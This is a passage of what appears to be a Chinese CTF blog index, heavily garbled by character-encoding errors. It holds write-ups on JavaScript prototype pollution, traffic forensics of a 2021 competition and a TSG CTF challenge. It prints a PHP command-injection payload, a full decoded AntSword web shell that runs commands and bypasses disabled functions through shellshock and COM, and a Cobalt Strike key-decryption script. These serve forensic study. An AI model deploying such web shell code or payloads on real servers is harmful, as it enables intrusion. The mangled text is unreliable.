jså„ç§å°trickä¸€ä¸ªæ­£æ•°çš„è´Ÿå¤§æ•°æ¬¡æ–¹ä¸º0ï¼Œè´Ÿæ•°çš„åˆ™ä¸º-0NaNå’ŒNaNä¸ç›¸ç­‰e++&lt;e--è‚¯å®šæ»¡è¶³ï¼›åšæ¯”è¾ƒæ—¶trueä¸º1,falseä¸º0ä»»ä½•éç©ºå­—ç¬¦ä¸²éƒ½ä¸ºçœŸ,jsä¸­ä¸¤ä¸ªç­‰å·ä¸ºå¼±ç±»å‹åˆ¤æ–­string(å¤§æ•°)è¿”å›Infinity;json.parse()å¯ä»¥å¤„ç†æ•°å­—inå¯¹æ•°ç»„æ¥è¯´æ˜¯åˆ¤æ–­æ•°ç»„çš„keyæ‹¬å·json.parse()åŸºæœ¬ä¸€æ ·æ•ˆæœ;json.parse()å¯ä»¥è§£æ__proto__å¯¹nullå˜é‡è¿›è¡Œæ•°ç»„å¯»å€ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”nullå˜é‡ä¸ºobject javascriptåŸå‹é“¾æ±¡æŸ“ä¸‰ç§å±æ€§1.__proto__å’Œconstructorå±æ€§æ˜¯å¯¹è±¡æ‰€ç‹¬æœ‰çš„:2.prototypeå±æ€§æ˜¯å‡½æ•°æ‰€ç‹¬æœ‰ ä½†æ˜¯ç”±äºJSä¸­å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿæ‹¥æœ‰__proto__å’Œconstructorå±æ€§ __proto__protoå±æ€§æ˜¯å¯¹è±¡æ‰€ç‹¬æœ‰çš„ ä½œç”¨ï¼šå½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡å†…éƒ¨ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆä»–å°±ä¼šå»å®ƒçš„protoå±æ€§æ‰€æŒ‡å‘çš„é‚£ä¸ªå¯¹è±¡ï¼ˆç†è§£ä¸ºçˆ¶å¯¹è±¡ï¼‰ï¼Œå¦‚æœçˆ¶å¯¹è±¡ä¹Ÿæ²¡æœ‰ï¼Œåˆ™åœ¨å¾€ä¸Šæ‰¾ï¼Œå¦‚æœä¸€ç›´åˆ°åŸå‹é“¾é¡¶ç«¯éƒ½æ²¡æœ‰è¯¥å±æ€§ï¼Œå°±ä¼šæŠ¥é”™ è¿™ç§é€šè¿‡__proto__å±æ€§æ¥è¿æ¥å¯¹è±¡ç›´åˆ°nullçš„ä¸€æ¡é“¾å³ä¸ºæˆ‘ä»¬æ‰€è°“çš„åŸå‹é“¾ã€‚å…¶å®æˆ‘ä»¬å¹³æ—¶è°ƒç”¨çš„å­—ç¬¦ä¸²æ–¹æ³•ã€æ•°ç»„æ–¹æ³•ã€å¯¹è±¡æ–¹æ³•ã€å‡½æ•°æ–¹æ³•ç­‰éƒ½æ˜¯é __proto__ç»§æ‰¿è€Œæ¥çš„ã€‚ prototypeå±æ€§å®ƒæ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„ï¼Œæ˜¯ä»å‡½æ•°æŒ‡å‘å¯¹è±¡ï¼Œå¹¶ä¸”æ˜¯å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼ˆå…¶å®æ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°ï¼‰æ‰€åˆ›å»ºçš„å®ä¾‹çš„åŸå‹å¯¹è±¡ï¼Œç”±æ­¤å¯çŸ¥ f1.__proto__==Foo.prototype **ä½œç”¨:**åŒ…å«å¯ä»¥ç”±ç‰¹å®šç±»å‹çš„æ‰€æœ‰å®ä¾‹æ‰€å…±äº«çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è®©è¯¥å‡½æ•°æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡ä»¬éƒ½å¯ä»¥æ‰¾åˆ°å…¬ç”¨çš„å±æ€§å’Œæ–¹æ³•ï¼Œä»»ä½•å‡½æ•°åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œå…¶å®ä¼šé»˜è®¤åŒæ—¶åˆ›å»ºè¯¥å‡½æ•°çš„prototypeå¯¹è±¡ constructorå±æ€§å®ƒæ˜¯å¯¹è±¡æ‰æ‹¥æœ‰çš„ï¼Œä»–æ˜¯ä»ä¸€ä¸ªå¯¹è±¡æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œå«ä¹‰å°±æ˜¯æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰æ„é€ å‡½æ•° åŸå‹é“¾eg: var a = {};console.log(a.__proto__); //Object {}console.log(a.__proto__ === a.constructor.prototype); //true å°ç»“1.æˆ‘ä»¬éœ€è¦ç‰¢è®°ä¸¤ç‚¹ï¼šâ‘ __proto__å’Œconstructorå±æ€§æ˜¯å¯¹è±¡æ‰€ç‹¬æœ‰çš„ï¼›â‘¡prototypeå±æ€§æ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„ï¼Œå› ä¸ºå‡½æ•°ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿæ‹¥æœ‰__proto__å’Œconstructorå±æ€§ã€‚ 2.__proto__å±æ€§çš„ä½œç”¨å°±æ˜¯å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡å†…éƒ¨ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆå°±ä¼šå»å®ƒçš„__proto__å±æ€§æ‰€æŒ‡å‘çš„é‚£ä¸ªå¯¹è±¡ï¼ˆçˆ¶å¯¹è±¡ï¼‰é‡Œæ‰¾ï¼Œä¸€ç›´æ‰¾ï¼Œç›´åˆ°__proto__å±æ€§çš„ç»ˆç‚¹nullï¼Œå†å¾€ä¸Šæ‰¾å°±ç›¸å½“äºåœ¨nullä¸Šå–å€¼ï¼Œä¼šæŠ¥é”™ã€‚é€šè¿‡__proto__å±æ€§å°†å¯¹è±¡è¿æ¥èµ·æ¥çš„è¿™æ¡é“¾è·¯å³æˆ‘ä»¬æ‰€è°“çš„åŸå‹é“¾ã€‚ 3.prototypeå±æ€§çš„ä½œç”¨å°±æ˜¯è®©è¯¥å‡½æ•°æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡ä»¬éƒ½å¯ä»¥æ‰¾åˆ°å…¬ç”¨çš„å±æ€§å’Œæ–¹æ³•ï¼Œå³f1.proto === Foo.prototypeã€‚(æ„æ€æ˜¯è®©f1å¯ä»¥æ‰¾åˆ°å…¬ç”¨çš„å±æ€§æ–¹æ³•ï¼Œå³å‘ä¸Šæ‰¾æœ‰prototypeç»™ä»–) 4.constructorå±æ€§çš„å«ä¹‰å°±æ˜¯æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œæ‰€æœ‰å‡½æ•°ï¼ˆæ­¤æ—¶çœ‹æˆå¯¹è±¡äº†ï¼‰æœ€ç»ˆçš„æ„é€ å‡½æ•°éƒ½æŒ‡å‘Functionã€‚ javascriptåŸºç¡€è¯­æ³•ä¼ è¾“æ•°æ®1.req.params/req.query/req.bodyreq.params eg:/modify/:file/modify/indexé‚£ä¹ˆreq.params.file=index req.query eg:?id=2é‚£ä¹ˆreq.query.idé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°2 req.body(é’ˆå¯¹postè¯·æ±‚) eg:post:username=adbcreq.body.username=adbc å®šä¹‰å˜é‡const: ç”¨äºå®šä¹‰ä¸å¯å˜å˜é‡**var å£°æ˜è¯­å¥å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå¹¶å¯é€‰åœ°å°†å…¶åˆå§‹åŒ–ä¸ºä¸€ä¸ªå€¼**process.env:è¿”å›åŒ…å«ç”¨æˆ·ç¯å¢ƒçš„å¯¹è±¡","link":"/2021/10/02/javascript%E5%A5%87%E5%A6%99%E7%9A%84%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"title":"2021ç»¿åŸæ¯","text":"å‰è¨€è¿™æ¬¡æ¯”èµ›ï¼Œéš¾å¾—å¾ˆéš¾ï¼Œç®€å•çš„å¾ˆç®€å•ï¼Œç„¶åç”±äºé‚£å¤©è¦ä¸Šè¯¾ï¼Œé¢˜ç›®æ²¡åšå•¥ï¼Œåé¢ä¸‹è¯¾ä¸€ç›´åœ¨çœ‹cmsï¼Œå¯¼è‡´looking for treasureæ²¡å»æ‰¾ï¼Œä»¥ä¸ºä¹Ÿæ˜¯jsçš„éš¾é¢˜ï¼Œåæ¥çœ‹åˆ°å¾ˆå¤šäººè§£å‡ºæ¥ï¼Œå°±å»æ‰¾ï¼Œå¯æ˜¯æ—¶é—´å·²ç»æ¥ä¸åŠäº†=-=ï¼Œä¸è¿‡ä»Šå¤©ä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæµé‡åˆ†æï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ ezphpç­¾åˆ°é¢˜ï¼Œå¾ˆç®€å•ï¼Œå°±æ˜¯assert()å‡½æ•°ï¼Œç„¶åè·Ÿå‰ä¸¤buuåˆšåšçš„é‚£é¢˜è€ƒç‚¹å·®ä¸å¤šï¼Œé—­åˆå‰é¢çš„å†…å®¹ï¼Œç„¶åé‡æ–°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ '.system(&quot;cd /var/www/html/;git status;&quot;).'about looking for treasuredefconçš„åŸé¢˜ https://blog.zeddyu.info/2020/10/15/Defcon28final/ é¢˜è§£åˆ†æç¬¬ä¸€ä¸ªæ¼æ´ç‚¹æ˜¯è¿™é‡Œ,ç›´æ¥åˆ©ç”¨åŒ…å«ï¼ŒåŒ…å«çš„æ—¶å€™å¦‚æœæŠ¥é”™ï¼Œä¼šç›´æ¥å°†æŠ¥é”™å†…å®¹æŠ¥å‡º let json_library = require(req.params.library) è¿™é‡Œå­˜åœ¨ä¸€ä¸ªjsçš„åŸå‹é“¾æ±¡æŸ“ç›´æ¥æœdefcon nooodeå³å¯ æµé‡å–è¯é¢˜ç›®æ”¾å‡ºhintï¼Œè¯´æ˜¯èšå‰‘ï¼Œäºæ˜¯æŸ¥è¯¢äº†ä¸€ä¸‹ å‘ç°å¾€è¿™è¾¹postäº†å¾ˆå¤šæ•°æ®ï¼Œä½†æ˜¯ç»è¿‡æ··æ·†ï¼Œå‘ç°äº†secret.zipæ‰¾åˆ°å‹ç¼©åŒ…ï¼Œç„¶åå°†å…¶å¯¼å‡ºç”¨010editeræ‰“å¼€ï¼Œ å‘ç°éœ€è¦å¯†ç  é‚£ä¹ˆå¯†ç è‚¯å®šå°±åœ¨è¢«æ··æ·†çš„é‚£äº›æ•°æ®å½“ä¸­äº†ï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“å¦‚ä½•è§£å¯†ï¼Œä½¿ç”¨pythonå†™ä¸€ä¸‹è„šæœ¬ import base64import zlibdef decode_config_cmd(basestr): return zlib.decompress(base64.b64decode(basestr),-zlib.MAX_WBITS)print(decode_config_cmd('c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6hIMzA1TzWwMExJs7CwiNXU1LQGAA==')) è§£å‹ç»“æœï¼š b'@eval(@gzinflate(base64_decode($_POST[_0xf057e081df888])));' ä½†æ˜¯å¾€ä¸‹ç»§ç»­è§£å¯†ï¼Œæ²¡å‘ç°å…¶ä»–æœ‰ç”¨çš„æ•°æ®ï¼Œå†ç»§ç»­å¾€ä¸‹çœ‹çœ‹æ•°æ®åŒ…çš„æ—¶å€™ï¼Œå°±å‘ç°ï¼Œæœ‰ä¸ªå¯¹secret.zipè¿›è¡Œå‹ç¼©çš„æ“ä½œ é’ˆå¯¹è¿™ä¸ªæ•°æ®ï¼Œè¿›è¡Œè§£å¯†çœ‹çœ‹ @ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) { $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(&quot;/;|:/&quot;, $opdir); @array_push($oparr, $ocwd, sys_get_temp_dir()); foreach ($oparr as $item) { if (!@is_writable($item)) { continue; } $tmdir = $item . &quot;/.fedd1&quot;; @mkdir($tmdir); if (!@file_exists($tmdir)) { continue; } @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) { @chdir(&quot;..&quot;); } @ini_set(&quot;open_basedir&quot;, &quot;/&quot;); @rmdir($tmdir); break; }}function asenc($out){ return $out;}function asoutput(){ $output = ob_get_contents(); ob_end_clean(); echo &quot;36&quot; . &quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot; . &quot;ff1&quot;;}ob_start();try { $p = base64_decode(substr($_POST[&quot;f861d394170244&quot;], 2)); $s = base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;], 2)); $envstr = @base64_decode(substr($_POST[&quot;b430b310838a93&quot;], 2)); $d = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c = substr($d, 0, 1) == &quot;/&quot; ? &quot;-c \\&quot;{$s}\\&quot;&quot; : &quot;/c \\&quot;{$s}\\&quot;&quot;; if (substr($d, 0, 1) == &quot;/&quot;) { @putenv(&quot;PATH=&quot; . getenv(&quot;PATH&quot;) . &quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;); } else { @putenv(&quot;PATH=&quot; . getenv(&quot;PATH&quot;) . &quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;); } if (!empty($envstr)) { $envarr = explode(&quot;|||asline|||&quot;, $envstr); foreach ($envarr as $v) { if (!empty($v)) { @putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v)); } } } $r = &quot;{$p} {$c}&quot;; function fe($f) { $d = explode(&quot;,&quot;, @ini_get(&quot;disable_functions&quot;)); if (empty($d)) { $d = array(); } else { $d = array_map('trim', array_map('strtolower', $d)); } return function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d); } function runshellshock($d, $c) { if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) { if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) { $tmp = tempnam(sys_get_temp_dir(), 'as'); putenv(&quot;PHP_LOL=() { x; }; {$c} &gt;{$tmp} 2&gt;&amp;1&quot;); if (fe('error_log')) { error_log(&quot;a&quot;, 1); } else { mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); } } else { return False; } $output = @file_get_contents($tmp); @unlink($tmp); if ($output != &quot;&quot;) { print $output; return True; } } return False; } function runcmd($c) { $ret = 0; $d = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if (fe('system')) { @system($c, $ret); } elseif (fe('passthru')) { @passthru($c, $ret); } elseif (fe('shell_exec')) { print @shell_exec($c); } elseif (fe('exec')) { @exec($c, $o, $ret); print join(&quot;\\r\\n&quot;, $o); } elseif (fe('popen')) { $fp = @popen($c, 'r'); while (!@feof($fp)) { print @fgets($fp, 2048); } @pclose($fp); } elseif (fe('proc_open')) { $p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io); while (!@feof($io[1])) { print @fgets($io[1], 2048); } while (!@feof($io[2])) { print @fgets($io[2], 2048); } @fclose($io[1]); @fclose($io[2]); @proc_close($p); } elseif (fe('antsystem')) { @antsystem($c); } elseif (runshellshock($d, $c)) { return $ret; } elseif (substr($d, 0, 1) != &quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) { $w = new COM('WScript.shell'); $e = $w-&gt;exec($c); $so = $e-&gt;StdOut(); $ret .= $so-&gt;ReadAll(); $se = $e-&gt;StdErr(); $ret .= $se-&gt;ReadAll(); print $ret; } else { $ret = 127; } return $ret; } $ret = @runcmd($r . &quot; 2&gt;&amp;1&quot;); print $ret != 0 ? &quot;ret={$ret}&quot; : &quot;&quot;;} catch (Exception $e) { echo &quot;ERROR://&quot; . $e-&gt;getMessage();}asoutput();die; å…³é”®ä»£ç å°±è¿™å‡ è¡Œ $p = base64_decode(substr($_POST[&quot;f861d394170244&quot;], 2)); $s = base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;], 2)); $envstr = @base64_decode(substr($_POST[&quot;b430b310838a93&quot;], 2)); å¯¹postçš„æ•°æ®ä»ç¬¬äºŒä½ä»¥åå¼€å§‹æˆªå–ï¼Œç„¶åè¿›è¡Œbase64è§£å¯†å¾—åˆ°ï¼Œé‚£ä¹ˆ-åé¢çš„åº”è¯¥å°±æ˜¯å¯†ç äº† b'cmd'b'cd /d &quot;D:\\\\\\\\phpstudy_pro\\\\\\\\WWW\\\\\\\\secret&quot;&amp;&quot;C:\\\\Program Files\\\\7-Zip\\\\7z.exe&quot; x secret.zip -pP4Uk6qkh6Gvqwg3y&amp;echo 378df2c234&amp;cd&amp;echo fb7f8f' åšåˆ°è¿™é‡Œï¼Œæˆ‘ä»¥ä¸ºå·²ç»å¿«ç»“æŸäº†ï¼Œæ²¡æƒ³åˆ°è¿˜æœ‰â€“ï¼Œè™½ç„¶è¯´è¿™ä¸ªæ–‡ä»¶å¯ä»¥ç”¨äº†ï¼Œä½†æ˜¯ä»–å°±åªæ˜¯ä¸€ä¸ªcsçš„beaconæ¨¡å¼å¯†é’¥ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä»ä¸‹é¢çš„beaconçš„æµé‡ä¸­åšä¸€ä¸‹æ–‡ç« :https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-chengå¤§æ¦‚è¯´ä¸€ä¸‹ï¼Œä½¿ç”¨beaconæ¨¡å¼ä¼ è¾“æ•°æ®ï¼Œä¼šå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”æ˜¯RSAéå¯¹ç§°åŠ å¯†ï¼Œå¹¶ä¸”å…¬é’¥å’Œç§é’¥éƒ½ä¼šå­˜å‚¨åœ¨è¿™ä¸ªkeyå½“ä¸­ï¼Œæ‰€ä»¥å…ˆé’ˆå¯¹keyè¿›è¡Œå…¬é’¥å’Œç§é’¥çš„è§£å‡ºï¼Œç„¶åå†å»è§£å¯†å…¶ä»–beaconæµé‡ï¼Œåº”è¯¥å°±å¯ä»¥æ‰¾åˆ°flagä½¿ç”¨äº†ä¸€ä¸‹ç½‘ä¸Šçš„é¡¹ç›®ï¼Œä½†æ˜¯javaç¨‹åºä¸€ç›´è·‘ä¸èµ·æ¥ï¼Œç­‰è§£å†³äº†å†æ¥è¡¥å……è¿™ä¸€éƒ¨åˆ†çš„æ“ä½œï¼Œæ‹¿åˆ°åŠ å¯†çš„ç§é’¥ä»¥å MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0HzUR1/wk5ZFY= è´´ä¸€ä¸‹å¤§ä½¬çš„è„šæœ¬ import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdump PRIVATE_KEY = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----{}-----END RSA PRIVATE KEY-----&quot;&quot;&quot; encode_data = &quot;bGOniQ5nfrSmAW9fgdZSCC+42t5xvQt+B4SVEu6Q8MvC4rPn/OThepmxP6GjDiP1wCUB1EE3sqeXkwdHHMd9wikZhiQnjT9AB3e2RNacCVF+8v/nj/Rv85fSD2Phfc/wsaAjld9Fy8ZJJKz1wPwPY6lTxArMGFtX7W+VW/gzujI=&quot;base64_key = &quot;&quot;&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0HzUR1/wk5ZFY=&quot;&quot;&quot; private_key = RSA.import_key(PRIVATE_KEY.format(base64_key).encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0) å¾—åˆ° AES key:7c83bf30a6ad2dc410040d33e1399cf6HMAC key:a77945b3a56687a39f90683cb24d00c2 ç„¶ååˆ©ç”¨è¿™ä¸¤ä¸ªaeså¯†é’¥å¯¹è¿”å›çš„å†…å®¹è¿›è¡Œè§£å¯†å‘ç°è¯»å–äº†flag.txtï¼Œäºæ˜¯å†å»å¯»æ‰¾ä¸€ä¸‹è¿”å›æµé‡ åœ¨ä¸‹æ¡æµé‡ä¸­å°±å‘ç°äº†è¿”å›çš„æ•°æ®ï¼Œæå–å…¶base64å½¢å¼ï¼Œå†å¯¹å…¶è¿›è¡Œè§£ç æ“ä½œ å³å¯æ‹¿åˆ°flag çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„é¢˜è§£ï¼Œå‘ç°è‡ªå·±æ˜¨å¤©å°±æ˜¯å›°åœ¨å¥—å¨ƒä»£ç ä¸çŸ¥é“å¦‚ä½•è§£å¼€çš„æ­¥éª¤","link":"/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AF/"},{"title":"2021å›½èµ›æ€»å†³èµ›å¤ç°","text":"babypython[å›½èµ›æ€»å†³èµ›å¤ç°]","link":"/2021/10/09/2021%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/"},{"title":"TSG2021+0ctf","text":"å‰è¨€æˆ˜é˜Ÿè®©åŠ çš„æ¯”èµ›è®¨è®ºç¾¤ä¸€ä¸ªæ²¡å°‘åŠ ï¼Œé¢˜ç›®ä¹Ÿæ˜¯ä¸€ä¸ªéƒ½ä¸ä¼šï¼Œå°±æŠŠä¸€äº›æ„Ÿè§‰ç°é˜¶æ®µå¯ä»¥å­¦æ‡‚çš„é¢˜ç›®å¤ç°ä¸€ä¸‹è¯•è¯•çœ‹ Welcome to TSG CTF!ç­¾åˆ°é¢˜ï¼Œç­¾äº†å¾ˆå¤šäºº const {promises: fs} = require('fs');const fastify = require('fastify');const flag = process.env.FLAG || 'DUMMY{DUMMY}';const app = fastify();app.get('/', async (_, res) =&gt; { res.type('text/html').send(await fs.readFile('index.html'));});app.post('/', (req, res) =&gt; { if (typeof req.body === 'object' &amp;&amp; req.body[flag] === true) { return res.send(`Nice! flag is ${flag}`); } return res.send(`You failed...`);});app.listen(34705, '0.0.0.0'); å…³é”®çš„ä»£ç åœ¨ typeof req.body === 'object' &amp;&amp; req.body[flag] === true æ„æ€æ˜¯è¯´ï¼Œpostä¼ å…¥çš„æ•°æ®çš„typeofä¸ºobjectï¼Œå¹¶ä¸”è¿™ä¸ªæ•°æ®çš„[flag]è¦ä¸ºtrueï¼Œè¿™é‡Œå°±éœ€è¦ç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯[flag]ï¼Œæ¯”å¦‚è¯´flagæ˜¯abcé‚£ä¹ˆä»–å°±æ˜¯[abc]ï¼Œæ¯”å¦‚è¯´æˆ‘ä¼ å…¥ä¸€ä¸ªtlif3ï¼Œé‚£ä¹ˆæˆ‘å°±è¦æœ‰ä¸€ä¸ªtlif3[abc]=trueï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯ä¸å¯èƒ½è¾¾æˆçš„ï¼Œå› ä¸ºæˆ‘ä»¬æ ¹æœ¬ä¸çŸ¥é“flagçš„å€¼ä¸ºå¤šå°‘ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æœ‰ä¸€ä¸ªå°trické¦–å…ˆtypeof ä¸ºobjectçš„æœ‰æ•°ç»„å¯¹è±¡ï¼Œè¿˜æœ‰ä¸€ä¸ªnullï¼Œè€Œå¦‚æœé’ˆå¯¹nullè¿›è¡Œå¯»å€çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œæ­¤æ—¶æŠ¥é”™å°±ä¼šå°†flagçš„å€¼ç»™å¸¦å‡º Win-Winåˆšåˆšå»çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ²¡ç¯å¢ƒäº†â€”äºæ˜¯å°±æŠŠé¢˜è§£è¯´çš„çœ‹ä¸€ä¸‹å§ windowsæ‰¾åå°ç›®å½•Windows åœ¨æœç´¢æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨åˆ°äº†FindFirstFile è¿™ä¸€ä¸ªwinapi å‡½æ•°ï¼Œè¯¥å‡½æ•°åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹(åŒ…æ‹¬å­æ–‡ä»¶å¤¹) å»æœç´¢æŒ‡å®šæ–‡ä»¶ã€‚åˆ©ç”¨æ–¹æ³•: æˆ‘ä»¬åªè¦å°†æ–‡ä»¶åä¸å¯çŸ¥éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ç”¨â€œ&lt;â€æˆ–è€…â€œ&gt;â€ä»£æ›¿å³å¯ï¼Œä¸è¿‡è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåªä½¿ç”¨ä¸€ä¸ªâ€œ&lt;â€æˆ–è€…â€œ&gt;â€åˆ™åªèƒ½ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ–‡ä»¶åæ˜¯12345æˆ–è€…æ›´é•¿ï¼Œè¿™æ—¶å€™è¯·æ±‚â€œ1&lt;â€æˆ–è€…â€œ1&gt;â€éƒ½æ˜¯è®¿é—®ä¸åˆ°æ–‡ä»¶çš„ï¼Œéœ€è¦â€œ1&lt;&lt;â€æ‰èƒ½è®¿é—®åˆ°ï¼Œä»£è¡¨ç»§ç»­å¾€ä¸‹æœç´¢ï¼Œæœ‰ç‚¹åƒWindowsçš„çŸ­æ–‡ä»¶åï¼Œè¿™æ ·æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥çˆ†ç ´ç›®å½•æ–‡ä»¶äº†ã€‚ å¯ä»¥å‘ç°åœ¨windowsç³»ç»Ÿä¸‹æ˜¯å¯ä»¥è¿™æ 